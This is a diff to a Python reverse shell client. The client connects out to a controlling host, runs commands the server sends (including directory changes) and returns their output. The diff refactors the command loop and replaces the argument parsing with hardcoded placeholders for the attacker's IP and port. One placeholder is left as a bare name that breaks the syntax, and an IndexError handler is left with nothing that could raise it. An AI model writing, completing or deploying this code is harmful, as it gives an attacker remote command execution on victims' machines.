@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 import pwd
-import sys
+
 
 
 def session_handler(sock, target_ip, target_port):
@@ -18,27 +18,20 @@ def session_handler(sock, target_ip, target_port):
             print('[-] The server has terminated the session.')
             sock.close()
             break
-        process_message(sock, message)
-
-
-def process_message(sock, message):
-    if message.split(" ")[0] == 'cd':
-        change_directory(sock, message)
-    elif message == 'background':
-        pass
-    else:
-        execute_command(sock, message)
-
-
-def change_directory(sock, message):
-    try:
-        directory = str(message.split(" ")[1])
-        os.chdir(directory)
-        cur_dir = os.getcwd()
-        print(f'[+] Changed to {cur_dir}')
-        outbound(sock, cur_dir)
-    except FileNotFoundError:
-        outbound(sock, 'Invalid directory.  Try again.')
+        elif message.split(" ")[0] == 'cd':
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                outbound(sock, cur_dir)
+            except FileNotFoundError:
+                outbound(sock, 'Invalid directory.  Try again.')
+                continue
+        elif message == 'background':
+            pass
+        else:
+            execute_command(sock, message)
 
 
 def execute_command(sock, message):
@@ -66,12 +59,11 @@ def outbound(sock, message):
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        target_ip = sys.argv[1]
-        target_port = int(sys.argv[2])
-        session_handler(sock, target_ip, target_port)
+        host_ip = 'INPUT_IP_HERE'
+        host_port = INPUT_PORT_HERE
+        session_handler(sock, host_ip, host_port)
     except IndexError:
         print('[-] Command line argument(s) missing.  Please try again.')
-        return
     except Exception as e:
         print(e)
 
